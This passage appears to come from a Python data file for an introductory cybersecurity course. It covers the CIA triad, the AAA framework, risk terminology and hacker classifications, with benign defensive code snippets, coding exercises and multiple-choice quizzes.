                "explanation": "Attacks targeting SCADA/ICS industrial systems and healthcare networks directly endanger human lives and national stability."
            },
            {
                "question": "What is 'Operational Security' (OpSec)?",
                "options": [
                    "A security and risk management process that prevents sensitive operational information and patterns from falling into adversary hands",
                    "Installing operating systems on fresh laptops",
                    "Cleaning server dust filters",
                    "Buying new office furniture"
                ],
                "correct_answer": "A security and risk management process that prevents sensitive operational information and patterns from falling into adversary hands",
                "explanation": "OpSec identifies critical organizational information and evaluates whether day-to-day operational habits inadvertently expose secrets."
            },
            {
                "question": "Under modern privacy regulations like GDPR, what can happen to a corporation that suffers a preventable data breach due to gross negligence?",
                "options": [
                    "Fines reaching tens of millions of dollars or up to 4% of annual global turnover, alongside civil lawsuits",
                    "The company CEO is awarded a medal",
                    "All employee computers are confiscated by the UN",
                    "The company is forced to make all future software free"
                ],
                "correct_answer": "Fines reaching tens of millions of dollars or up to 4% of annual global turnover, alongside civil lawsuits",
                "explanation": "Data protection regulations carry devastating financial penalties and mandatory breach disclosure laws for non-compliant organizations."
            }
        ]
    ),

    # ---------------------------------------------------------
    # Day 15: The CIA Triad (Confidentiality, Integrity, Availability)
    # ---------------------------------------------------------
    DayBlueprint(
        order=15,
        title="Day 15: The CIA Triad (Confidentiality, Integrity, Availability)",
        concept="Mastering the foundational pillar of all cybersecurity engineering: Confidentiality (privacy & encryption), Integrity (tamper-proofing & hashing), and Availability (uptime & redundancy).",
        analogy="Think of your bank savings account: Confidentiality means your nosy neighbor cannot look at your account balance. Integrity means a dishonest teller cannot add a zero or delete your funds without authorization. Availability means the ATM and banking app work when you need to withdraw cash at 2:00 AM on Sunday.",
        theory_sections=[
            {
                "heading": "The Three Pillars of the CIA Triad",
                "content": (
                    "Every security policy, tool, and control maps directly to one or more pillars of the CIA Triad:\n\n"
                    "1. **Confidentiality**: Ensuring that sensitive information is accessible ONLY to authorized personnel and concealed from everyone else.\n"
                    "   - *Controls*: AES encryption, multi-factor authentication, file permissions (ACLs), data masking.\n"
                    "   - *Threats*: Eavesdropping, packet sniffing, data leaks, shoulder surfing.\n\n"
                    "2. **Integrity**: Guaranteeing that data and systems remain accurate, consistent, and unaltered by unauthorized parties.\n"
                    "   - *Controls*: Cryptographic hashes (SHA-256), digital signatures, database transaction logs, version control.\n"
                    "   - *Threats*: Data tampering, man-in-the-middle packet modification, unauthorized database updates.\n\n"
                    "3. **Availability**: Ensuring that systems, networks, and applications are operational and accessible to authorized users when needed.\n"
                    "   - *Controls*: Redundant power supplies (UPS), server clustering, RAID disk arrays, DDoS mitigation (Cloudflare).\n"
                    "   - *Threats*: Distributed Denial of Service (DDoS), ransomware encryption, physical hardware failures."
                )
            },
            {
                "heading": "Balancing the Triad vs Usability",
                "content": (
                    "Security is always a delicate balance. A computer buried in 10 feet of concrete with no network cables has 100% Confidentiality and Integrity, but 0% Availability. Effective security engineering achieves robust risk reduction without making business workflows impossible."
                )
            }
        ],
        code_snippets=[
            {
                "title": "Mapping Security Violations to the CIA Triad",
                "language": "bash",
                "code": (
                    "# Scenario A: An attacker dumps a database of 100,000 cleartext passwords\n"
                    "# -> Violation: CONFIDENTIALITY\n\n"
                    "# Scenario B: An attacker alters medical drug dosage numbers in patient records\n"
                    "# -> Violation: INTEGRITY\n\n"
                    "# Scenario C: A massive DDoS attack crashes a hospital's booking portal\n"
                    "# -> Violation: AVAILABILITY"
                ),
                "explanation": "Incident responders immediately classify every reported security ticket by the primary CIA pillar impacted."
            },
            {
                "title": "Python: Demonstrating Data Integrity Verification using SHA-256",
                "language": "python",
                "code": (
                    "import hashlib\n\n"
                    "def generate_checksum(text: str) -> str:\n"
                    "    return hashlib.sha256(text.encode()).hexdigest()\n\n"
                    "original_contract = 'Pay Employee $5,000 upon completion.'\n"
                    "tampered_contract = 'Pay Employee $50,000 upon completion.'\n\n"
                    "hash1 = generate_checksum(original_contract)\n"
                    "hash2 = generate_checksum(tampered_contract)\n\n"
                    "print(f'Original Hash: {hash1}')\n"
                    "print(f'Tampered Hash: {hash2}')\n"
                    "print('Integrity Intact:', hash1 == hash2)"
                ),
                "explanation": "Cryptographic hashes demonstrate that changing even a single dollar sign completely changes the SHA-256 hash, proving tampering."
            }
        ],
        coding_challenge={
            "description": "Write a Python function `classify_cia_threat(incident_type: str) -> str` that maps 'ransomware' -> 'AVAILABILITY', 'data_leak' -> 'CONFIDENTIALITY', 'data_tampering' -> 'INTEGRITY', and 'ddos' -> 'AVAILABILITY'. Return 'UNKNOWN' for any other string.",
            "starter_code": (
                "def classify_cia_threat(incident_type: str) -> str:\n"
                "    # Return 'CONFIDENTIALITY', 'INTEGRITY', 'AVAILABILITY', or 'UNKNOWN'\n"
                "    return ''\n\n"
                "print(classify_cia_threat('data_leak'))\n"
                "print(classify_cia_threat('data_tampering'))\n"
                "print(classify_cia_threat('ddos'))"
            ),
            "solution_code": (
                "def classify_cia_threat(incident_type: str) -> str:\n"
                "    mapping = {\n"
                "        'data_leak': 'CONFIDENTIALITY',\n"
                "        'packet_sniffing': 'CONFIDENTIALITY',\n"
                "        'data_tampering': 'INTEGRITY',\n"
                "        'checksum_mismatch': 'INTEGRITY',\n"
                "        'ddos': 'AVAILABILITY',\n"
                "        'ransomware': 'AVAILABILITY',\n"
                "        'server_crash': 'AVAILABILITY'\n"
                "    }\n"
                "    return mapping.get(incident_type.lower(), 'UNKNOWN')\n\n"
                "print(classify_cia_threat('data_leak'))\n"
                "print(classify_cia_threat('data_tampering'))\n"
                "print(classify_cia_threat('ddos'))"
            ),
            "expected_output": "CONFIDENTIALITY\nINTEGRITY\nAVAILABILITY"
        },
        quizzes=[
            {
                "question": "What three core security principles make up the 'CIA Triad'?",
                "options": [
                    "Confidentiality, Integrity, and Availability",
                    "Central Intelligence Agency, Crime, and Action",
                    "Computers, Internet, and Antivirus",
                    "Control, Identification, and Authentication"
                ],
                "correct_answer": "Confidentiality, Integrity, and Availability",
                "explanation": "The CIA Triad is the foundational framework of information security: Confidentiality (privacy), Integrity (accuracy), and Availability (uptime)."
            },
            {
                "question": "An attacker intercepts a bank wire transfer message and modifies the recipient bank account number. Which pillar of the CIA Triad has been directly breached?",
                "options": ["Integrity", "Confidentiality", "Availability", "Accounting"],
                "correct_answer": "Integrity",
                "explanation": "Integrity ensures that data remains accurate and unaltered during transit or storage. Modifying account numbers violates data integrity."
            },
            {
                "question": "A massive Distributed Denial of Service (DDoS) attack floods an e-commerce website with bogus traffic, causing legitimate shoppers to experience connection timeouts. Which pillar is breached?",
                "options": ["Availability", "Confidentiality", "Integrity", "Authentication"],
                "correct_answer": "Availability",
                "explanation": "Availability guarantees that authorized users have timely, reliable access to systems. DDoS denies access by overwhelming resources."
            },
            {
                "question": "Which of the following security mechanisms is primarily used to enforce Confidentiality?",
                "options": [
                    "AES-256 data encryption and strict access controls",
                    "Redundant power supplies (UPS)",
                    "RAID 1 hard drive mirroring",
                    "Daily data backups on external tapes"
                ],
                "correct_answer": "AES-256 data encryption and strict access controls",
                "explanation": "Encryption converts readable data into ciphertext so that only parties with the cryptographic key can read it, enforcing confidentiality."
            },
            {
                "question": "Why are cryptographic hash algorithms (like SHA-256) used in software downloads and forensic investigations?",
                "options": [
                    "To prove data Integrity by generating a unique digital fingerprint that changes if even one bit is modified",
                    "To compress the file so it downloads faster",
                    "To hide the file from antivirus scanners",
                    "To convert the file into an executable program"
                ],
                "correct_answer": "To prove data Integrity by generating a unique digital fingerprint that changes if even one bit is modified",
                "explanation": "Hash verification guarantees data integrity: if the downloaded file's calculated hash matches the vendor's published hash, the file was not altered."
            }
        ]
    )
,

    # ---------------------------------------------------------
    # Day 16: The AAA Framework (Authentication, Authorization, Accounting)
    # ---------------------------------------------------------
    DayBlueprint(
        order=16,
        title="Day 16: The AAA Framework (Authentication, Authorization, Accounting)",
        concept="Understanding the fundamental access governance architecture: Authentication (proving identity), Authorization (determining permissions), and Accounting (logging and auditing activities).",
        analogy="Think of boarding an international airplane: Authentication is showing your passport to prove you are who you claim to be. Authorization is the gate agent checking your boarding pass to confirm you sit in seat 14B instead of the cockpit. Accounting is the airline's flight manifest log recording the exact second your ticket was scanned at the gate.",
        theory_sections=[
            {
                "heading": "The Three Pillars of AAA",
                "content": (
                    "The AAA framework governs every secure access control interaction:\n\n"
                    "1. **Authentication (Who are you?)**: Verifying the declared identity of a subject using credentials (passwords, biometrics, hardware tokens, Kerberos tickets).\n"
                    "2. **Authorization (What are you allowed to do?)**: Granting or denying access to specific resources based on access policies (e.g., standard users cannot delete customer databases).\n"
                    "3. **Accounting / Auditing (What did you do?)**: Generating an immutable, timestamped record of user sessions, commands executed, and files accessed. Essential for compliance and incident investigations."
                )
            },
            {
                "heading": "Centralized AAA Protocols in Enterprise Networks",
                "content": (
                    "Enterprises do not manage user accounts on individual routers or servers. Instead, they use centralized AAA servers:\n"
                    "- **RADIUS (Remote Authentication Dial-In User Service)**: Standard for Wi-Fi access (802.1X) and VPN connections.\n"
                    "- **TACACS+ (Terminal Access Controller Access-Control System Plus)**: Cisco protocol that completely separates authentication and authorization, encrypting the entire packet payload."
                )
            }
        ],
        code_snippets=[
            {
                "title": "Inspecting Security Audit Logs (Windows Event Viewer & Linux auth.log)",
                "language": "bash",
                "code": (
                    "# Windows PowerShell: Querying Event ID 4624 (Successful Logon) and 4625 (Failed Logon):\n"
                    "Get-WinEvent -FilterHashtable @{LogName='Security'; Id=4625} -MaxEvents 5 | Format-List\n\n"
                    "# Linux: Inspecting authentication attempts in system logs:\n"
                    "sudo grep 'Failed password' /var/log/auth.log\n"
                    "lastlog   # Shows the most recent login timestamp for all local users"
                ),
                "explanation": "Accounting records allow security analysts to detect brute-force attacks and establish audit trails during investigations."
            },
            {
                "title": "Python: Implementing an AAA Enforcement Engine",
                "language": "python",
                "code": (
                    "import time\n\n"
                    "class AAAEngine:\n"
                    "    def __init__(self):\n"
                    "        self.users = {'alice': 'hashed_secret_123'}\n"
                    "        self.permissions = {'alice': {'read', 'write'}}\n"
                    "        self.audit_log = []\n"
                    "    \n"
                    "    def authenticate(self, user: str, password_hash: str) -> bool:\n"
                    "        return self.users.get(user) == password_hash\n"
                    "    \n"
                    "    def authorize(self, user: str, action: str) -> bool:\n"
                    "        return action in self.permissions.get(user, set())\n"
                    "    \n"
                    "    def account(self, user: str, action: str, success: bool):\n"
                    "        record = f'[{time.strftime(\"%Y-%m-%d %H:%M:%S\")}] User={user} Action={action} Success={success}'\n"
                    "        self.audit_log.append(record)\n\n"
                    "engine = AAAEngine()\n"
                    "if engine.authenticate('alice', 'hashed_secret_123'):\n"
                    "    allowed = engine.authorize('alice', 'delete')\n"
                    "    engine.account('alice', 'delete', allowed)\n"
                    "print(engine.audit_log)"
                ),
                "explanation": "Illustrates programmatic separation of concerns across authentication, authorization, and accounting."
            }
        ],
        coding_challenge={
            "description": "Write a Python function `aaa_check(credentials_valid: bool, user_role: str, action: str) -> dict` that returns a dict `{'status': 'SUCCESS' or 'DENIED', 'reason': str}`. Deny if credentials are invalid ('AUTH_FAILED'), or if action is 'DELETE' and role is not 'ADMIN' ('UNAUTHORIZED').",
            "starter_code": (
                "def aaa_check(credentials_valid: bool, user_role: str, action: str) -> dict:\n"
                "    # Return {'status': 'SUCCESS' or 'DENIED', 'reason': str}\n"
                "    return {}\n\n"
                "print(aaa_check(False, 'ADMIN', 'READ'))\n"
                "print(aaa_check(True, 'USER', 'DELETE'))\n"
                "print(aaa_check(True, 'ADMIN', 'DELETE'))"
            ),
            "solution_code": (
                "def aaa_check(credentials_valid: bool, user_role: str, action: str) -> dict:\n"
                "    if not credentials_valid:\n"
                "        return {'status': 'DENIED', 'reason': 'AUTH_FAILED'}\n"
                "    if action.upper() == 'DELETE' and user_role.upper() != 'ADMIN':\n"
                "        return {'status': 'DENIED', 'reason': 'UNAUTHORIZED'}\n"
                "    return {'status': 'SUCCESS', 'reason': 'OK'}\n\n"
                "print(aaa_check(False, 'ADMIN', 'READ'))\n"
                "print(aaa_check(True, 'USER', 'DELETE'))\n"
                "print(aaa_check(True, 'ADMIN', 'DELETE'))"
            ),
            "expected_output": "{'status': 'DENIED', 'reason': 'AUTH_FAILED'}\n{'status': 'DENIED', 'reason': 'UNAUTHORIZED'}\n{'status': 'SUCCESS', 'reason': 'OK'}"
        },
        quizzes=[
            {
                "question": "What is the critical distinction between Authentication and Authorization in the AAA framework?",
                "options": [
                    "Authentication verifies who you are; Authorization determines what resources and actions you are permitted to access",
                    "Authentication is for Windows; Authorization is for Linux",
                    "Authentication checks credit card balances; Authorization logs off users",
                    "There is no difference; they are exact synonyms"
                ],
                "correct_answer": "Authentication verifies who you are; Authorization determines what resources and actions you are permitted to access",
                "explanation": "Authentication proves a subject's identity (login credentials), while authorization checks if that authenticated subject has permission for a specific file or action."
            },
            {
                "question": "Which component of the AAA framework is directly responsible for generating timestamped audit trails of user actions and resource consumption?",
                "options": ["Accounting", "Authentication", "Authorization", "Administration"],
                "correct_answer": "Accounting",
                "explanation": "Accounting records what actions a user took, when they logged in/out, and how many resources they consumed, serving as an evidentiary log."
            },
            {
                "question": "In Windows Event Logs, what does Event ID 4625 indicate to a security analyst?",
                "options": [
                    "An account failed to log on (failed authentication)",
                    "A successful operating system update",
                    "The computer was shut down cleanly",
                    "A new printer was installed"
                ],
                "correct_answer": "An account failed to log on (failed authentication)",
                "explanation": "Event ID 4625 records failed logon events, essential for detecting password spraying and brute-force intrusion attempts."
            },
            {
                "question": "Which enterprise protocol separates Authentication and Authorization into distinct functions and encrypts the entire packet payload?",
                "options": ["TACACS+", "RADIUS", "HTTP", "Telnet"],
                "correct_answer": "TACACS+",
                "explanation": "Cisco's TACACS+ separates authentication from authorization and encrypts the entire packet body, unlike RADIUS which only encrypts the password."
            },
            {
                "question": "Why is the Accounting pillar indispensable during post-breach digital forensics?",
                "options": [
                    "Without immutable accounting logs, it is impossible to reconstruct an attacker's lateral movements, timeline, or accessed files",
                    "Accounting logs automatically erase the attacker's laptop",
                    "Accounting pays the insurance company automatically",
                    "Accounting prevents computers from overheating"
                ],
                "correct_answer": "Without immutable accounting logs, it is impossible to reconstruct an attacker's lateral movements, timeline, or accessed files",
                "explanation": "Auditable accounting logs are the primary evidence investigators use to determine breach blast radius and prove regulatory compliance."
            }
        ]
    ),

    # ---------------------------------------------------------
    # Day 17: Core Terminologies: Vulnerability, Threat, Risk, Exploit
    # ---------------------------------------------------------
    DayBlueprint(
        order=17,
        title="Day 17: Core Terminologies: Vulnerability, Threat, Risk, Exploit",
        concept="Dissecting the four core terminology pillars of cybersecurity risk management: Vulnerability (weakness), Threat (danger), Exploit (weapon), and Risk (probability times impact).",
        analogy="Think of a home: A wooden front door with a broken lock is a **Vulnerability** (a weakness). A burglar lurking down the street looking for houses to rob is a **Threat** (a potential danger). A crowbar custom-shaped to pry open that broken lock is an **Exploit** (the tool/mechanism). The likelihood of being robbed and losing $10,000 worth of jewelry is the **Risk**.",
        theory_sections=[
            {
                "heading": "The Fundamental Cybersecurity Equation",
                "content": (
                    "Security professionals use exact terminology to quantify risk:\n\n"
                    "1. **Vulnerability**: A flaw or weakness in software code, hardware design, or system configuration that could be exploited (e.g., unpatched software, weak password, open firewall port). Cataloged via **CVE (Common Vulnerabilities and Exposures)** IDs.\n"
                    "2. **Threat**: Any circumstance or entity with the potential to adversely impact an asset through unauthorized access, destruction, or denial of service. The actor causing the threat is a **Threat Actor**.\n"
                    "3. **Exploit**: A piece of software, script, payload, or sequence of commands that takes advantage of a specific vulnerability to compromise a system.\n"
                    "4. **Risk**: The financial or operational loss resulting from the combination of the likelihood of a threat exploiting a vulnerability and the severity of impact:\n"
                    "   `Risk = Likelihood x Impact`"
                )
            },
            {
                "heading": "Understanding CVSS (Common Vulnerability Scoring System)",
                "content": (
                    "The **CVSS score** is an open industry standard ranking vulnerability severity from 0.0 to 10.0:\n"
                    "- Low: 0.1 - 3.9\n"
                    "- Medium: 4.0 - 6.9\n"
                    "- High: 7.0 - 8.9\n"
                    "- Critical: 9.0 - 10.0 (e.g., Log4Shell, EternalBlue; allows remote unauthenticated root access)."
                )
            }
        ],
        code_snippets=[
            {
                "title": "Searching the National Vulnerability Database (NVD) via cURL",
                "language": "bash",
                "code": (
                    "# Querying NVD API for critical CVEs matching a keyword:\n"
                    "curl -s \"https://services.nvd.nist.gov/rest/json/cves/2.0?keywordSearch=OpenSSL\" | jq '.vulnerabilities[0].cve.id'\n\n"
                    "# Inspecting CVE severity score:\n"
                    "# CVE-2021-44228 (Log4j): CVSS Base Score: 10.0 (CRITICAL)"
                ),
                "explanation": "Security teams automate API queries against vulnerability databases to discover newly published CVEs impacting their tech stack."
            },
            {
                "title": "Python: Calculating Risk Matrix Scores",
                "language": "python",
                "code": (
                    "def calculate_risk(likelihood: int, impact: int) -> dict:\n"
                    "    # Likelihood and Impact on 1 to 5 scale\n"
                    "    score = likelihood * impact\n"
                    "    level = 'LOW'\n"
                    "    if score >= 15:\n"
                    "        level = 'CRITICAL'\n"
                    "    elif score >= 10:\n"
                    "        level = 'HIGH'\n"
                    "    elif score >= 5:\n"
                    "        level = 'MEDIUM'\n"
                    "    return {'score': score, 'risk_level': level}\n\n"
                    "print(calculate_risk(likelihood=5, impact=4)) # e.g. Public unpatched RCE\n"
                    "print(calculate_risk(likelihood=1, impact=2)) # e.g. Obscure lab server"
                ),
                "explanation": "Standard risk quantification formula prioritizing remediation tickets based on risk score rather than theoretical flaw existence alone."
            }
        ],
        coding_challenge={
            "description": "Write a Python function `categorize_cvss(score: float) -> str` that returns 'NONE' if score == 0.0, 'LOW' if 0.1 <= score <= 3.9, 'MEDIUM' if 4.0 <= score <= 6.9, 'HIGH' if 7.0 <= score <= 8.9, and 'CRITICAL' if 9.0 <= score <= 10.0.",
            "starter_code": (
                "def categorize_cvss(score: float) -> str:\n"
                "    # Return 'NONE', 'LOW', 'MEDIUM', 'HIGH', or 'CRITICAL'\n"
                "    return ''\n\n"
                "print(categorize_cvss(9.8))\n"
                "print(categorize_cvss(5.3))\n"
                "print(categorize_cvss(2.1))"
            ),
            "solution_code": (
                "def categorize_cvss(score: float) -> str:\n"
                "    if score == 0.0:\n"
                "        return 'NONE'\n"
                "    elif 0.1 <= score <= 3.9:\n"
                "        return 'LOW'\n"
                "    elif 4.0 <= score <= 6.9:\n"
                "        return 'MEDIUM'\n"
                "    elif 7.0 <= score <= 8.9:\n"
                "        return 'HIGH'\n"
                "    elif 9.0 <= score <= 10.0:\n"
                "        return 'CRITICAL'\n"
                "    return 'INVALID'\n\n"
                "print(categorize_cvss(9.8))\n"
                "print(categorize_cvss(5.3))\n"
                "print(categorize_cvss(2.1))"
            ),
            "expected_output": "CRITICAL\nMEDIUM\nLOW"
        },
        quizzes=[
            {
                "question": "What is a 'Vulnerability' in cybersecurity terminology?",
                "options": [
                    "A flaw, bug, or weakness in a system or design that could be accidentally or maliciously exploited",
                    "A hacker sitting in a coffee shop",
                    "A malicious software program like ransomware",
                    "The physical computer keyboard"
                ],
                "correct_answer": "A flaw, bug, or weakness in a system or design that could be accidentally or maliciously exploited",
                "explanation": "A vulnerability is an inherent flaw (e.g., missing input validation in code, unpatched server) that creates a security exposure."
            },
            {
                "question": "What is the difference between a Vulnerability and an Exploit?",
                "options": [
                    "A vulnerability is the underlying weakness; an exploit is the actual code or technique designed to take advantage of that weakness",
                    "An exploit is a legal contract; a vulnerability is a computer brand",
                    "There is no difference; both mean a computer virus",
                    "Vulnerabilities only exist on smartphones, while exploits only exist on servers"
                ],
                "correct_answer": "A vulnerability is the underlying weakness; an exploit is the actual code or technique designed to take advantage of that weakness",
                "explanation": "The vulnerability is the hole in the armor; the exploit is the weapon specifically forged to strike through that hole."
            },
            {
                "question": "In security risk assessment formulas, how is 'Risk' calculated?",
                "options": [
                    "Risk = Likelihood x Impact",
                    "Risk = CPU Speed / RAM Size",
                    "Risk = Number of Employees + Firewalls",
                    "Risk = Total Hard Drive Megabytes"
                ],
                "correct_answer": "Risk = Likelihood x Impact",
                "explanation": "Risk represents the probability of a threat exploiting a vulnerability multiplied by the resulting business or financial harm (impact)."
            },
            {
                "question": "What does a CVSS Base Score of 9.8 indicate about a newly discovered software vulnerability?",
                "options": [
                    "It is a CRITICAL vulnerability that allows severe compromise (e.g., remote code execution without user interaction)",
                    "It is completely harmless and can be ignored",
                    "The vulnerability only impacts printer paper",
                    "The computer needs to be thrown in the trash"
                ],
                "correct_answer": "It is a CRITICAL vulnerability that allows severe compromise (e.g., remote code execution without user interaction)",
                "explanation": "CVSS scores between 9.0 and 10.0 are classified as Critical, typically representing unauthenticated remote code execution or data exposure."
            },
            {
                "question": "What is a 'Zero-Day' vulnerability?",
                "options": [
                    "A software security flaw unknown to the vendor, meaning zero days of patches or defenses currently exist to protect against it",
                    "A virus that deletes itself after zero minutes",
                    "A computer manufactured on the first day of the year",
                    "A free trial of antivirus software"
                ],
                "correct_answer": "A software security flaw unknown to the vendor, meaning zero days of patches or defenses currently exist to protect against it",
                "explanation": "A Zero-Day is unknown to the software developer, meaning threat actors can exploit it freely until discovered and patched."
            }
        ]
    ),

    # ---------------------------------------------------------
    # Day 18: Types of Hackers (White Hat, Black Hat, Gray Hat)
    # ---------------------------------------------------------
    DayBlueprint(
        order=18,
        title="Day 18: Types of Hackers (White Hat, Black Hat, Gray Hat)",
        concept="Classifying hacker profiles based on legality, intent, and authorization: White Hat (ethical penetration testers), Black Hat (criminal cyber adversaries), and Gray Hat (unauthorized bug hunters who disclose responsibly).",
        analogy="Think of locksmiths: A White Hat is a certified locksmith hired by a homeowner to test if their front door can be picked, submitting a written report. A Black Hat is a burglar who picks the lock at midnight to steal the television. A Gray Hat picks the lock uninvited, leaves a note on the kitchen counter saying 'Your lock is broken, pay me $50 to fix it', and leaves without stealing anything.",
        theory_sections=[
            {
                "heading": "Hacker Hat Classifications",
                "content": (
                    "The term 'hacker' originated as an expert who creatively solves technical problems. In modern cybersecurity, hackers are categorized by motivation and legal permission:\n\n"
                    "1. **White Hat (Ethical Hackers)**: Work with explicit, written legal authorization. They perform penetration testing, vulnerability assessments, and red teaming to find and fix bugs before adversaries exploit them.\n"
                    "2. **Black Hat (Malicious Hackers / Cybercriminals)**: Operate illegally without authorization. Driven by financial theft, industrial espionage, extortion (ransomware), or political sabotage.\n"
                    "3. **Gray Hat**: Hack into systems without prior authorization, but without malicious intent to steal or destroy data. They often disclose vulnerabilities to the target company (or publicly if ignored), though their actions remain legally questionable."
                )
            },
            {
                "heading": "Rules of Engagement & Bug Bounty Programs",
                "content": (
                    "Ethical hackers operate under strict **Rules of Engagement (RoE)** and Scope definitions. Organizations run **Bug Bounty Programs** (via platforms like HackerOne and Bugcrowd), providing safe harbor and cash rewards to researchers who discover and responsibly disclose security flaws."
                )
            }
        ],
        code_snippets=[
            {
                "title": "Inspecting a Security.txt Responsible Disclosure Policy",
                "language": "bash",
                "code": (
                    "# Most major companies publish an RFC 9116 security.txt file:\n"
                    "curl -s https://www.google.com/.well-known/security.txt\n\n"
                    "# Expected content:\n"
                    "# Contact: https://g.co/vulnz\n"
                    "# Encryption: https://services.google.com/html/contact/security-key.asc\n"
                    "# Policy: https://bughunters.google.com/about/rules"
                ),
                "explanation": "RFC 9116 security.txt files inform ethical security researchers how to legally report vulnerabilities without facing lawsuits."
            },
            {
                "title": "Python: Auditing URL Target Scope for Penetration Testing",
                "language": "python",
                "code": (
                    "import urllib.parse\n\n"
                    "def is_target_in_scope(target_url: str, authorized_domains: list) -> bool:\n"
                    "    parsed = urllib.parse.urlparse(target_url)\n"
                    "    hostname = parsed.hostname or ''\n"
                    "    for domain in authorized_domains:\n"
                    "        if hostname == domain or hostname.endswith('.' + domain):\n"
                    "            return True\n"
                    "    return False\n\n"
                    "scope = ['tesla.com', 'shop.tesla.com']\n"
                    "print('In Scope:', is_target_in_scope('https://shop.tesla.com/login', scope))\n"
                    "print('In Scope:', is_target_in_scope('https://third-party-billing.com', scope))"
                ),
                "explanation": "Ethical hackers strictly verify testing scope boundaries to avoid accidental illegal penetration testing of unauthorized third parties."
            }
        ],
        coding_challenge={
            "description": "Write a Python function `classify_hacker(has_authorization: bool, malicious_intent: bool) -> str` that returns 'WHITE_HAT' if authorized and not malicious, 'BLACK_HAT' if not authorized and malicious, 'GRAY_HAT' if not authorized and not malicious, and 'ROGUE_INSIDER' if authorized and malicious.",
            "starter_code": (
                "def classify_hacker(has_authorization: bool, malicious_intent: bool) -> str:\n"
                "    # Return 'WHITE_HAT', 'BLACK_HAT', 'GRAY_HAT', or 'ROGUE_INSIDER'\n"
                "    return ''\n\n"
                "print(classify_hacker(True, False))\n"
                "print(classify_hacker(False, True))\n"
                "print(classify_hacker(False, False))"
            ),
            "solution_code": (
                "def classify_hacker(has_authorization: bool, malicious_intent: bool) -> str:\n"
                "    if has_authorization and not malicious_intent:\n"
                "        return 'WHITE_HAT'\n"
                "    if not has_authorization and malicious_intent:\n"
                "        return 'BLACK_HAT'\n"
                "    if not has_authorization and not malicious_intent:\n"
                "        return 'GRAY_HAT'\n"
                "    return 'ROGUE_INSIDER'\n\n"
                "print(classify_hacker(True, False))\n"
                "print(classify_hacker(False, True))\n"
                "print(classify_hacker(False, False))"
            ),
            "expected_output": "WHITE_HAT\nBLACK_HAT\nGRAY_HAT"
        },
        quizzes=[
            {
                "question": "What is the single most critical legal factor that separates a White Hat ethical hacker from a Black Hat cybercriminal?",
                "options": [
                    "Written authorization and permission from the system owner prior to testing",
                    "The programming language they use to write exploits",
                    "Whether they use Windows or Linux",
                    "The color of clothing they wear"
                ],
                "correct_answer": "Written authorization and permission from the system owner prior to testing",
                "explanation": "Ethical hacking requires explicit, written legal authorization (Scope / Rules of Engagement). Hacking without permission violates computer crime laws."
            },
            {
                "question": "What defines a 'Gray Hat' hacker?",
                "options": [
                    "Someone who hacks into systems without authorization, but does not steal or destroy data, often disclosing the flaw to the owner",
                    "A retired hacker who no longer uses computers",
                    "An FBI cyber agent undercover in criminal forums",
                    "A hacker who only works during winter"
                ],
                "correct_answer": "Someone who hacks into systems without authorization, but does not steal or destroy data, often disclosing the flaw to the owner",
                "explanation": "Gray hats cross legal boundaries by hacking without permission, but their underlying intent is disclosure rather than theft or extortion."
            },
            {
                "question": "What is a 'Bug Bounty Program'?",
                "options": [
                    "A formal program managed by organizations offering financial rewards and legal safe harbor to ethical hackers for discovering and responsibly reporting bugs",
                    "An extermination service for office termites",
                    "A software tool that deletes computer files",
                    "A fine issued by the police for downloading music"
                ],
                "correct_answer": "A formal program managed by organizations offering financial rewards and legal safe harbor to ethical hackers for discovering and responsibly reporting bugs",
                "explanation": "Companies like Google, Apple, and banks invite ethical researchers to test their systems, paying bounties (often $500 to $100,000+) for valid vulnerability disclosures."
            },
            {
                "question": "What is the role of a 'Red Team' in enterprise security?",
                "options": [
                    "An internal or external offensive security team simulating realistic adversary attacks to test the organization's defenses",
                    "The team that writes marketing emails",
                    "The IT support desk that resets lost user passwords",
                    "The human resources department"
                ],
                "correct_answer": "An internal or external offensive security team simulating realistic adversary attacks to test the organization's defenses",
                "explanation": "Red Teams act as real-world adversaries to test people, processes, and technology, while the Blue Team defends the organization."
            },
            {
                "question": "What standard web file is hosted at `/.well-known/security.txt` on modern domains?",
                "options": [
                    "A standardized document informing security researchers how and where to report security vulnerabilities responsibly",
                    "A list of all company passwords",
                    "A virus scanner that runs inside Google Chrome",
                    "The website's advertising terms and conditions"
                ],
                "correct_answer": "A standardized document informing security researchers how and where to report security vulnerabilities responsibly",
                "explanation": "RFC 9116 establishes `security.txt` as the standard discovery mechanism for vulnerability disclosure contact information."
            }
        ]
    ),

    # ---------------------------------------------------------
    # Day 19: Hacktivists, Script Kiddies, and Advanced Persistent Threats (APTs)
    # ---------------------------------------------------------
    DayBlueprint(
        order=19,
        title="Day 19: Hacktivists, Script Kiddies, and Advanced Persistent Threats (APTs)",
        concept="Analyzing threat actor taxonomy: Script Kiddies (low skill, automated tools), Hacktivists (politically motivated), Insiders (authorized employees), and Nation-State APTs (sophisticated, persistent, state-sponsored).",
        analogy="Think of military threats: A Script Kiddie is a kid throwing firecrackers in an alley using a store-bought lighter. A Hacktivist is a protest crowd painting political slogans on the city hall wall. An Insider Threat is a trusted guard opening the back door for a friend. An APT (Advanced Persistent Threat) is a stealth foreign military intelligence agency digging a secret tunnel into a nuclear facility over two years.",
        theory_sections=[
            {
                "heading": "Threat Actor Profiles and Motivations",
                "content": (
                    "Understanding *who* is attacking and *why* shapes incident response:\n\n"
                    "1. **Script Kiddies**: Low-skilled amateurs who download automated point-and-click exploit tools (e.g., LOIC, SQLmap) written by others. Motivated by bragging rights or curiosity. High volume, low sophistication.\n"
                    "2. **Hacktivists (e.g., Anonymous)**: Driven by political, ideological, religious, or environmental activism. Tactics: Website defacements, DDoS campaigns, and publishing leaked executive emails.\n"
                    "3. **Cybercriminals (Organized Crime)**: Highly organized syndicates running Ransomware-as-a-Service (RaaS) operations. Solely motivated by monetary extortion and wire fraud.\n"
                    "4. **Insider Threats**: Current or former employees, contractors, or business partners with legitimate access who misuse their privileges (maliciously or through negligence).\n"
                    "5. **APTs (Advanced Persistent Threats)**: Nation-state intelligence agencies or heavily funded military cyber units (e.g., Fancy Bear / APT28, Lazarus Group). Characteristics: Zero-day exploits, multi-year stealth persistence, supply chain compromises."
                )
            },
            {
                "heading": "The MITRE ATT&CK Framework",
                "content": (
                    "Security teams map threat actor behaviors using the **MITRE ATT&CK Matrix**, cataloging adversary Tactics, Techniques, and Procedures (TTPs) across the intrusion lifecycle (Reconnaissance -> Initial Access -> Lateral Movement -> Exfiltration)."
                )
            }
        ],
        code_snippets=[
            {
                "title": "Mapping Known APT Groups and Nation-State Identifiers",
                "language": "bash",
                "code": (
